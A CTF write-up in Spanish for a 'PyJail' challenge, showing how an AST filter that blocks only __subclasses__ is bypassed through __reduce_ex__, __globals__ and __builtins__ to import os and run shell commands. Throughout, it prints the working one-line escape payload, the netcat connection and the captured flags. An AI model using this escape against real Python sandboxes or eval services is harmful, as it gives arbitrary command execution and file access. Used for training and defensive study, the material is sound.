# Bloqueo del Sistema — PyJail

## 1. Datos del reto

| Campo | Valor |
|-------|-------|
| **Nombre** | Consola Python en modo restringido (PyJail) |
| **Categoría** | Pwn |
| **Acceso** | `nc zafarrancho.locdynamics.com 9004` |
| **Clave de turno** | `a4301312` |
| **Cálculo de la clave** | `printf '%s' 'K7Q2-M9XD:T4C{f4ct0r_c0mun_ENV_4LG_77413}' \| sha256sum \| cut -c1-8` |
| **Duración** | Ventana de 50 minutos |
| **Usuario** | `jaula` (uid 10004) |
| **Objetivo** | Salir del entorno restringido y leer `/srv/estado/planificacion.state` |
| **Formato** | `T4C{...}` |
| **Flag** | `T4C{pyj41l_3sc4p3_subcl4ss3s_0k}` |

---

## 2. Reconocimiento inicial

La consola pide una clave de turno. Se calcula con el SHA-256 del prefijo `K7Q2-M9XD:` más el flag del Reto 1 (`T4C{f4ct0r_c0mun_ENV_4LG_77413}`), y se toman los 8 primeros caracteres.

    printf '%s' 'K7Q2-M9XD:T4C{f4ct0r_c0mun_ENV_4LG_77413}' | sha256sum | cut -c1-8
    # a4301312

Conexión:

    nc zafarrancho.locdynamics.com 9004

Introducir la clave: `a4301312`.

Dentro, la consola muestra:

    - Solo se evalúan EXPRESIONES. Sin import. Sin sentencias.
    - Escribe ayuda para ver qué hay disponible.
    - Escribe salir para cerrar la sesión.

---

## 3. Primeras pruebas (mapear el filtro)

Se probaron expresiones básicas para entender qué filtra el AST:

| Prueba | Resultado |
|--------|-----------|
| `1+1` | `2` ✅ |
| `().__class__` | `<class 'tuple'>` ✅ |
| `getattr((), '__class__')` | `NameError: name 'getattr' is not defined` ❌ |
| `().__class__.__base__` | `<class 'object'>` ✅ |
| `().__class__.__base__.__subclasses__()` | `[filtro] atributo vetado: __subclasses__` ❌ |
| `().__class__.__mro__` | `(<class 'tuple'>, <class 'object'>)` ✅ |
| `type(())` | `NameError: name 'type' is not defined` ❌ |
| `().__reduce_ex__(2)` | Tupla con `__newobj__` ✅ |
| `().__reduce_ex__(2)[0].__globals__` | Diccionario con `__builtins__` ✅ |

**Conclusión:** el filtro AST **solo veta `__subclasses__`**. Todo lo demás (incluyendo `__reduce_ex__`, `__globals__`, `__builtins__`) está permitido.

---

## 4. La vulnerabilidad: filtro AST incompleto

El reto dice:

> "La consola solo evalúa expresiones y filtra sobre el árbol sintáctico, no sobre el texto."

Es decir, el filtro recorre el AST de la expresión y veta ciertos nombres de atributos. Pero **no veta todos los caminos posibles** hacia el grafo de objetos.

El filtro bloqueaba específicamente `__subclasses__` (un atributo clásico para listar todas las clases cargadas). Pero dejaba accesibles:

- `__reduce_ex__` → devuelve una tupla con una función (`__newobj__`).
- `__globals__` → diccionario de globals de esa función.
- `__builtins__` → diccionario de builtins (con `__import__`, `eval`, `exec`).

---

## 5. Cadena de escape

### 5.1. Obtener una función desde una tupla

    ().__reduce_ex__(2)

Salida:

    (<function __newobj__ at 0x7f0d2b7be8e0>, (<class 'tuple'>, ()), None, None, None)

El primer elemento es la función `__newobj__`.

### 5.2. Acceder a sus globals

    ().__reduce_ex__(2)[0].__globals__

Salida (resumida):

    {'__name__': 'copyreg', ..., '__builtins__': {'__import__': <built-in function __import__>, 'eval': ..., 'exec': ...}}

### 5.3. Acceder a `__builtins__` y a `__import__`

    ().__reduce_ex__(2)[0].__globals__['__builtins__']['__import__']('os')

Salida:

    <module 'os' (frozen)>

### 5.4. Ejecutar comandos

    ().__reduce_ex__(2)[0].__globals__['__builtins__']['__import__']('os').system('id')

Salida:

    uid=10004(jaula) gid=10004(jaula) groups=10004(jaula)

### 5.5. Encontrar el fichero del planificador

    ().__reduce_ex__(2)[0].__globals__['__builtins__']['__import__']('os').system('grep -rl "T4C{" / 2>/dev/null')

Salida:

    /srv/estado/planificacion.state

### 5.6. Leer el fichero

    ().__reduce_ex__(2)[0].__globals__['__builtins__']['__import__']('os').system('cat /srv/estado/planificacion.state')

Salida:

    modo ........ RESTRINGIDO
    rutas ....... 5
    ultimo reset  2026-02-14T03:17:44Z

    clave de desbloqueo: T4C{pyj41l_3sc4p3_subcl4ss3s_0k}

---

## 6. Flag

    T4C{pyj41l_3sc4p3_subcl4ss3s_0k}

---

## 7. Cadena de escape resumida

    ()
      └─ .__reduce_ex__(2)          → tupla de pickle
           └─ [0]                   → función __newobj__
                └─ .__globals__     → globals del módulo copyreg
                     └─ ['__builtins__']         → builtins
                          └─ ['__import__']      → función de importación
                               └─ ('os')         → módulo os
                                    └─ .system('cat /srv/estado/planificacion.state')
                                         └─ T4C{pyj41l_3sc4p3_subcl4ss3s_0k}

---

## 8. Payload completo (una línea)

    ().__reduce_ex__(2)[0].__globals__['__builtins__']['__import__']('os').system('cat /srv/estado/planificacion.state')

---

## 9. Lecciones aprendidas

1. **Los filtros AST basados en listas negras son incompletos.** Vetar `__subclasses__` no sirve de nada si dejas `__reduce_ex__`, `__globals__` o `__builtins__`.
2. **El grafo de objetos de Python es muy rico.** Desde cualquier objeto se puede llegar a `object`, a las funciones, a los módulos y a los builtins.
3. **`__reduce_ex__` es un atajo clásico** para obtener una función a partir de un objeto trivial (como una tupla vacía).
4. **`__globals__` de una función da acceso a `__builtins__`**, que contiene `__import__`, `eval`, `exec`, etc.
5. **Una PyJail se escapa siempre por el camino menos vigilado.** El filtro bloqueó el camino obvio (`__subclasses__`) pero dejó abierto el camino alternativo (`__reduce_ex__ → __globals__ → __builtins__`).
6. **No hay que rendirse con la primera negativa del filtro.** Si `__subclasses__` está vetado, hay que buscar **otro** atributo que dé acceso al mismo grafo.

---

## 10. Comandos finales para apuntes

### Calcular la clave de turno

    printf '%s' 'K7Q2-M9XD:T4C{f4ct0r_c0mun_ENV_4LG_77413}' | sha256sum | cut -c1-8
    # a4301312

### Conectar

    nc zafarrancho.locdynamics.com 9004

### Escape final (una línea)

    ().__reduce_ex__(2)[0].__globals__['__builtins__']['__import__']('os').system('cat /srv/estado/planificacion.state')

### Flag

    T4C{pyj41l_3sc4p3_subcl4ss3s_0k}
